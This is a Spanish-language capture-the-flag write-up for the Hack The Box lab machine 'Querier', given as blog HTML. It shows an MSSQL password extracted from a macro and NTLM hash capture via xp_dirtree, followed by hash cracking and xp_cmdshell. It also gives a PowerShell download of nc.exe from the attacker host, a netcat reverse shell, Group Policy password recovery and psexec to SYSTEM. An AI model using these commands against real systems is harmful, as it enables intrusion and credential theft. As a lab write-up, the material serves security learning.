@@ -1,0 +1,594 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Hack The Box - Querier :: sckull — HackTheBox Writeups, CTF</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Nombre Help     OS Linux   Puntos 30   Dificultad Medio   IP 10.10.10.125   Maker mrh4sh &amp;amp; egre55      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [7.8,8.4,5.9,4.1,1.6] }, { label: &#34;Maker&#34;, fill: true, backgroundColor: &#34;"/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://sckull.github.io/posts/querier/" />
+
+
+<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">
+
+
+<link rel="stylesheet" href="https://sckull.github.io/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://sckull.github.io/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="Hack The Box - Querier :: sckull — HackTheBox Writeups, CTF" />
+<meta name="twitter:description" content="Nombre Help     OS Linux   Puntos 30   Dificultad Medio   IP 10.10.10.125   Maker mrh4sh &amp;amp; egre55      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [7.8,8.4,5.9,4.1,1.6] }, { label: &#34;Maker&#34;, fill: true, backgroundColor: &#34;" />
+<meta name="twitter:site" content="https://sckull.github.io" />
+<meta name="twitter:creator" content="sckull" />
+<meta name="twitter:image" content="https://sckull.github.io/../../image/htb/querier/cover.png">
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Hack The Box - Querier :: sckull — HackTheBox Writeups, CTF">
+<meta property="og:description" content="Nombre Help     OS Linux   Puntos 30   Dificultad Medio   IP 10.10.10.125   Maker mrh4sh &amp;amp; egre55      new Chart(document.getElementById(&#34;radar-chart&#34;), { type: &#39;radar&#39;, data: { labels: [&#34;Enumeration&#34;, &#34;Real-Life&#34;, &#34;CVE&#34;, &#34;Custom Exploitation&#34;, &#34;CTF-Like&#34;], datasets: [ { label: &#34;User&#34;, fill: true, backgroundColor: &#34;rgba(179,181,198,0.2)&#34;, borderColor: &#34;rgba(179,181,198,1)&#34;, pointBorderColor: &#34;#fff&#34;, pointBackgroundColor: &#34;rgba(179,181,198,1)&#34;, data: [7.8,8.4,5.9,4.1,1.6] }, { label: &#34;Maker&#34;, fill: true, backgroundColor: &#34;" />
+<meta property="og:url" content="https://sckull.github.io/posts/querier/" />
+<meta property="og:site_name" content="Hack The Box - Querier" />
+<meta property="og:image" content="https://sckull.github.io/../../image/htb/querier/cover.png">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2019-06-22 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+</head>
+<body class="">
+<div class="container">
+  <header class="header">
+  <span class="header__inner">
+    <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="https://sckull.github.io/about">About</a></li>
+        
+      
+        
+          <li><a href="https://sckull.github.io/tags/">Tags</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="https://sckull.github.io/about">About</a></li>
+      
+    
+      
+        <li><a href="https://sckull.github.io/tags/">Tags</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
+</header>
+
+  
+  <div class="content">    
+    
+  <div class="post">
+    <h2 class="post-title"><a href="https://sckull.github.io/posts/querier/">Hack The Box - Querier</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+            Saturday, Jun 22, 2019
+        </span>
+      
+      <span class="post-author">— Written by sckull</span>
+      
+    </div>
+        
+    
+      <span class="post-tags">Tags:
+        
+         #<a href="https://sckull.github.io/tags/hackthebox/">hackthebox</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/msscan/">MSSCAN</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/nmap/">nmap</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/samba/">SAMBA</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/mssql/">MSSQL</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/hashcat/">hashcat</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/powersploit/">PowerSploit</a>&nbsp;
+        
+         #<a href="https://sckull.github.io/tags/impacket/">impacket</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="https://sckull.github.io/posts/querier/../../image/htb/querier/cover.png" class="post-cover" />
+      
+      <hr />
+     
+    
+    <div class="post-content">      
+      
+
+<table>
+<thead>
+<tr>
+<th>Nombre</th>
+<th>Help</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>OS</td>
+<td>Linux</td>
+</tr>
+
+<tr>
+<td>Puntos</td>
+<td>30</td>
+</tr>
+
+<tr>
+<td>Dificultad</td>
+<td>Medio</td>
+</tr>
+
+<tr>
+<td>IP</td>
+<td>10.10.10.125</td>
+</tr>
+
+<tr>
+<td>Maker</td>
+<td><a href="https://www.hackthebox.eu/home/users/profile/2570">mrh4sh</a> &amp; <a href="https://www.hackthebox.eu/home/users/profile/1190">egre55</a></td>
+</tr>
+</tbody>
+</table>
+
+<div id="grapher"><canvas id="radar-chart" width="100" height="50"></canvas>
+    <script>
+    new Chart(document.getElementById("radar-chart"), {
+    type: 'radar',
+    data: {
+      labels: ["Enumeration", "Real-Life", "CVE", "Custom Exploitation", "CTF-Like"],
+      datasets: [
+        {
+          label: "User",
+          fill: true,
+          backgroundColor: "rgba(179,181,198,0.2)",
+          borderColor: "rgba(179,181,198,1)",
+          pointBorderColor: "#fff",
+          pointBackgroundColor: "rgba(179,181,198,1)",
+          data: [7.8,8.4,5.9,4.1,1.6]
+        }, {
+          label: "Maker",
+          fill: true,
+          backgroundColor: "rgba(255,99,132,0.2)",
+          borderColor: "rgba(255,99,132,1)",
+          pointBorderColor: "#fff",
+          pointBackgroundColor: "rgba(255,99,132,1)",
+          pointBorderColor: "#fff",
+          data: [0,0,0,0,0]
+        }
+      ]
+    },
+    options: {
+      title: {
+        display: true,
+        text: 'Calificacion'
+      }
+    }
+});
+    </script>
+</div>
+
+<hr />
+
+<h2 id="masscan">MASSCAN</h2>
+
+<p>Utilizando la herramienta masscan para hacer un escaneo rapido de todos los puertos en tcp y udp</p>
+
+<pre><code class="language-bash">masscan -p1-65535,U:1-65535 10.10.10.125 --rate=1000 -e tun0
+
+Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-19 05:54:40 GMT
+ -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [131070 ports/host]
+Discovered open port 49665/tcp on 10.10.10.125                                 
+Discovered open port 49666/tcp on 10.10.10.125                                 
+Discovered open port 49670/tcp on 10.10.10.125                                 
+Discovered open port 47001/tcp on 10.10.10.125                                 
+Discovered open port 135/tcp on 10.10.10.125                                   
+Discovered open port 49664/tcp on 10.10.10.125                                 
+Discovered open port 5985/tcp on 10.10.10.125                                  
+Discovered open port 49668/tcp on 10.10.10.125                                 
+Discovered open port 49671/tcp on 10.10.10.125                                 
+Discovered open port 139/tcp on 10.10.10.125 
+</code></pre>
+
+<p><img src="../../image/htb/querier/Screenshot_20190219_000350.png" alt="image" /></p>
+
+<h2 id="http">HTTP</h2>
+
+<p>Al realizar una busqueda de archivos y directorios en el <code>puerto 5985</code> no encontramos nada.
+<img src="../../image/htb/querier/Screenshot_20190220_181124.png" alt="image" /></p>
+
+<h2 id="smbclient">SMBCLIENT</h2>
+
+<p>Enumerando <code>SHARENAMES</code> con smbclient encontramos <code>Reports</code> e intentamos conectarnos.</p>
+
+<pre><code class="language-bash">smbclient -L 10.10.10.125
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	Reports         Disk      
+</code></pre>
+
+<p>Dentro de <code>Reports</code> econtramos un archivo xlsm el cual no contiene nada</p>
+
+<pre><code class="language-bash">smbclient \\\\10.10.10.125\\Reports
+
+'Currency Volume Report.xlsm'
+</code></pre>
+
+<h2 id="binwalk">Binwalk</h2>
+
+<p><img src="../../image/htb/querier/Screenshot_20190220_181033.png" alt="image" /></p>
+
+<p>Al utilizar <code>BinWalk</code> para analizar el archivo en busqueda de archivos ocultos encontramos dentro del archivo un macro con el siguiente codigo:</p>
+
+<pre><code class="language-visual-basic">Rem Attribute VBA_ModuleType=VBADocumentModule
+Option VBASupport 1
+
+' macro to pull data for client volume reports
+'
+' further testing required
+
+Private Sub Connect()
+
+Dim conn As ADODB.Connection
+Dim rs As ADODB.Recordset
+
+Set conn = New ADODB.Connection
+conn.ConnectionString = &quot;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6&quot;
+conn.ConnectionTimeout = 10
+conn.Open
+
+If conn.State = adStateOpen Then
+
+  ' MsgBox &quot;connection successful&quot;
+ 
+  'Set rs = conn.Execute(&quot;SELECT * @@version;&quot;)
+  Set rs = conn.Execute(&quot;SELECT * FROM volume;&quot;)
+  Sheets(1).Range(&quot;A1&quot;).CopyFromRecordset rs
+  rs.Close
+
+End If
+
+End Sub
+</code></pre>
+
+<h2 id="microsoft-sql-server">MICROSOFT SQL SERVER</h2>
+
+<p>Ya que tenemos credenciales para la base de datos procedemos a utilizar <code>mssqlclient.py</code> el cual es un script que funciona para conectarnos a una base de datos utilizando autenticacion de windows. Ya dentro encontramos bases de datos que son por &ldquo;default&rdquo; en Microsoft SQL Server.</p>
+
+<p><a href="https://facility9.com/2009/10/an-introduction-to-sql-server-system-databases/"><strong>SQL Server Database</strong></a></p>
+
+<pre><code class="language-bash">python mssqlclient.py -p 1433 -windows-auth -debug reporting:'PcwTWTHRwryjc$c6'@10.10.10.125
+
+SQL&gt; SELECT name FROM master.dbo.sysdatabases
+name                                                                                                                              
+--------------------------------------------------------------------------------------------------------------------------------  
+master                                                                                                                            
+tempdb                                                                                                                            
+model                                                                                                                             
+msdb                                                                                                                              
+volume
+</code></pre>
+
+<h2 id="mssql-boo">MSSQL BOO</h2>
+
+<p>Enumerando las diferentes bases de datos no encontramos ningun tipo de usuario y contraseña que nos pudiesen ayudar para conectarnos con otro usuario, asi mismo la ejecucion de comandos no esta permitida para nuestro usuario <code>reporting</code>. Pero el usuario si esta permitido para ejecutar <code>xp_fileexist</code> y <code>xp_dirtree</code>, por lo que aprovechando estos podemos hacer Out-of-Band. Se utilizo smbserver.py de forma local para crear un <code>servidor samba</code> y con mssqlclient.py se ejecuto el comando para hacer una &lsquo;consulta&rsquo; hacia nuestra maquina y asi obtener las contraseñas.</p>
+
+<pre><code class="language-bash">exec master..xp_fileexist '\10.10.12.75\pwn' -- -
+declare @q varchar(99);set @q='\\10.10.14.23\test';exec master.dbo.xp_dirtree @q HTTP/1.1
+</code></pre>
+
+<h3 id="local">LOCAL</h3>
+
+<pre><code class="language-bash">python smbserver.py -smb2support -port 445 -ip 10.10.12.220 Me /tmp/me
+</code></pre>
+
+<h3 id="remote">REMOTE</h3>
+
+<pre><code class="language-bash">EXEC MASTER.sys.xp_dirtree '\\10.10.12.220\Me', 1, 1
+</code></pre>
+
+<p><a href="https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478"><strong>CAPTURE MSSQL CREDENTIALS WITH SMBSERVER</strong></a></p>
+
+<p><img src="../../image/htb/querier/Screenshot_20190220_230209.png" alt="image" /></p>
+
+<h4 id="hashcat">Hashcat</h4>
+
+<p>Utilizamos hashcat para desencriptar.</p>
+
+<pre><code class="language-bash">./hashcat64.bin -m 5600 -o querier.txt ntlm.txt ../rockyou.txt
+
+mssql-svc::QUERIER:4141414141414141:8ef8d7fe8b397a3f34c6a0c4117ea619:010100000000000080f39672a1c9d401d5aeaac9f68f78d8000000000100100059004200680076004d007a006c005100020010004f007900530049004f00570045004c000300100059004200680076004d007a006c005100040010004f007900530049004f00570045004c000700080080f39672a1c9d4010600040002000000080030003000000000000000000000000030000042faac07e9e6916b7b486a8189925f3a6881014abed60765f5683d0f0e8104bf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310032002e00320032003000000000000000000000000000
+</code></pre>
+
+<h4 id="decrypted">DECRYPTED</h4>
+
+<pre><code class="language-text">MSSQL-SVC::QUERIER:4141414141414141:8ef8d7fe8b397a3f34c6a0c4117ea619:010100000000000080f39672a1c9d401d5aeaac9f68f78d8000000000100100059004200680076004d007a006c005100020010004f007900530049004f00570045004c000300100059004200680076004d007a006c005100040010004f007900530049004f00570045004c000700080080f39672a1c9d4010600040002000000080030003000000000000000000000000030000042faac07e9e6916b7b486a8189925f3a6881014abed60765f5683d0f0e8104bf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310032002e00320032003000000000000000000000000000:corporate568
+</code></pre>
+
+<h2 id="user-flag">USER - FLAG</h2>
+
+<pre><code class="language-bash">python mssqlclient.py -p 1433 -windows-auth -debug MSSQL-SVC:'corporate568'@10.10.10.125
+</code></pre>
+
+<p>Ya que obtuvimos usuario y contraseña de podemos utilizarlos y activar <code>xp_cmdshell</code> para ejecutar comando dentro de la computadora.</p>
+
+<pre><code class="language-sql">EXEC sp_configure 'show advanced options', 1; EXEC sp_configure reconfigure; EXEC sp_configure 'xp_cmdshell', 1;EXEC sp_configure reconfigure; 
+</code></pre>
+
+<p>Ejecutando comandos, leyendo el flag <code>user.txt</code>.</p>
+
+<pre><code class="language-bash">EXEC master.dbo.xp_cmdshell 'more C:\Users\mssql-svc\Desktop\user.txt';
+output                                                                                                                                                                                                                                                           
+--------------------------------------
+c37b41bb669da345bb14de50faab3c16
+</code></pre>
+
+<h2 id="shell-inversa-netcat">SHELL INVERSA - NETCAT</h2>
+
+<p>Utilizando powershell para descargar <code>nc.exe</code> (netcat) en la computadora.</p>
+
+<pre><code class="language-powershell">EXEC master.dbo.xp_cmdshell 'powershell -command &quot;&amp; { iwr 10.10.12.33/nc.exe -OutFile C:\Users\mssql-svc\Desktop\nc.exe }&quot;';
+</code></pre>
+
+<p>Utilizando nc.exe (netcat) para conectarnos de forma inversa a nuestro puerto local</p>
+
+<pre><code class="language-sql">EXEC master.dbo.xp_cmdshell 'C:\Users\mssql-svc\Desktop\nc.exe -e cmd 10.10.12.33 7878';
+</code></pre>
+
+<h3 id="local-1">Local</h3>
+
+<pre><code class="language-bash">nc -lvp 7878
+</code></pre>
+
+<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>
+
+<p>Estando dentro de la maquina como <code>MSSQL-SVC</code> procedemos a hacer una enumeracion con <code>PowerUp</code> el cual es un script escrito en powershell para enumerar los diferentes vectores de ataque para escalar privilegios en windows.</p>
+
+<h3 id="powerup">PowerUp</h3>
+
+<p>Descargamos, importamos PowerUp y hacemos una enumeracion de todas las funciones que contiene.</p>
+
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc"><strong>PowerUp.ps1</strong></a></p>
+
+<pre><code class="language-powershell">powershell -command &quot;&amp; { iwr 10.10.12.33/power.ps1 -OutFile C:\Users\mssql-svc\Desktop\power.ps1 }&quot;
+Import-Module .\power.ps1
+</code></pre>
+
+<pre><code class="language-powershell">Invoke-AllChecks | Out-File -Encoding ASCII checks.txt
+
+
+[*] Running Invoke-AllChecks
+[*] Checking if user is in a local group with administrative privileges...
+[*] Checking for unquoted service paths...
+[*] Checking service executable and argument permissions...
+[*] Checking service permissions...
+[*] Checking %PATH% for potentially hijackable DLL locations...
+
+ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
+IdentityReference : QUERIER\mssql-svc
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
+
+[*] Checking for AlwaysInstallElevated registry key...
+[*] Checking for Autologon credentials in registry...
+[*] Checking for modifidable registry autoruns and configs...
+[*] Checking for modifiable schtask files/configs...
+[*] Checking for unattended install files...
+
+UnattendPath : C:\Windows\Panther\Unattend.xml
+
+[*] Checking for encrypted web.config strings...
+[*] Checking for encrypted application pool and virtual directory passwords...
+[*] Checking for plaintext passwords in McAfee SiteList.xml files....
+[*] Checking for cached Group Policy Preferences .xml files....
+
+Changed   : {2019-01-28 23:12:48}
+UserNames : {Administrator}
+NewName   : [BLANK]
+Passwords : {MyUnclesAreMarioAndLuigi!!1!}
+File      : C:\ProgramData\Microsoft\Group 
+            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
+</code></pre>
+
+<p>Al finalizar Nos encontramos que existe un archivo de <code>Groups Policy</code> que contiene un Usuario y Contraseña, en este caso el de Administrator. Utilizando el script <code>psexec.py</code> para conectarnos de manera remota con el Usuario Administrator y obtener una shell con <code>nt authority\system</code>.</p>
+
+<pre><code class="language-bash">python psexec.py -debug Administrator:'MyUnclesAreMarioAndLuigi!!1!'@10.10.10.125
+
+root@sckull:~/impacket/examples# python psexec.py -debug Administrator:'MyUnclesAreMarioAndLuigi!!1!'@10.10.10.125
+Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
+
+[+] StringBinding ncacn_np:10.10.10.125[\pipe\svcctl]
+[+] Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.
+Download it from https://www.dlitz.net/software/pycrypto
+[*] Requesting shares on 10.10.10.125.....
+[*] Found writable share ADMIN$
+[*] Uploading file WsaCFcep.exe
+[*] Opening SVCManager on 10.10.10.125.....
+[*] Creating service EOzc on 10.10.10.125.....
+[*] Starting service EOzc.....
+[+] Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.
+Download it from https://www.dlitz.net/software/pycrypto
+[!] Press help for extra shell commands
+[+] Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.
+Download it from https://www.dlitz.net/software/pycrypto
+[+] Your pycrypto doesn't support AES.MODE_CCM. Currently only pycrypto experimental supports this mode.
+Download it from https://www.dlitz.net/software/pycrypto
+Microsoft Windows [Version 10.0.17763.292]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+nt authority\system
+
+C:\Windows\system32&gt;cd ..
+
+C:\Windows&gt;cd C:\
+
+C:\&gt;cd Users\Administrator
+
+C:\Users\Administrator&gt;cd Desktop
+
+C:\Users\Administrator\Desktop&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is FE98-F373
+
+ Directory of C:\Users\Administrator\Desktop
+
+01/29/2019  12:04 AM    &lt;DIR&gt;          .
+01/29/2019  12:04 AM    &lt;DIR&gt;          ..
+01/28/2019  12:08 AM                33 root.txt
+               1 File(s)             33 bytes
+               2 Dir(s)   5,970,571,264 bytes free
+
+C:\Users\Administrator\Desktop&gt;more root.txt
+b19c3794f786a1fdcf205f81497c3592
+</code></pre>
+
+    </div>    
+    <hr />
+    <div >
+      
+        
+<div id="disqus_thread"></div>
+<script>
+(function() {
+var d = document, s = d.createElement('script');
+s.src = 'https://sckull.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+      
+      
+    </div>
+    
+      <div class="pagination">
+        <div class="pagination__title">
+          <span class="pagination__title-h">Read other posts</span>
+          <hr />
+        </div>
+        <div class="pagination__buttons">
+          
+          
+            <span class="button next">
+              <a href="https://sckull.github.io/posts/help/">
+                <span class="button__text">Hack The Box - Help</span>
+                <span class="button__icon">→</span>
+              </a>
+            </span>
+          
+        </div>
+      </div>
+      
+    
+    
+    </div>
+    
+  </div>
+  
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="https://sckull.github.io/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#000" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">sckull | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://sckull.github.io/assets/main.js"></script>
+<script src="https://sckull.github.io/assets/prism.js"></script>
+
+
+  
+</div>
+
+</body>
+</html>
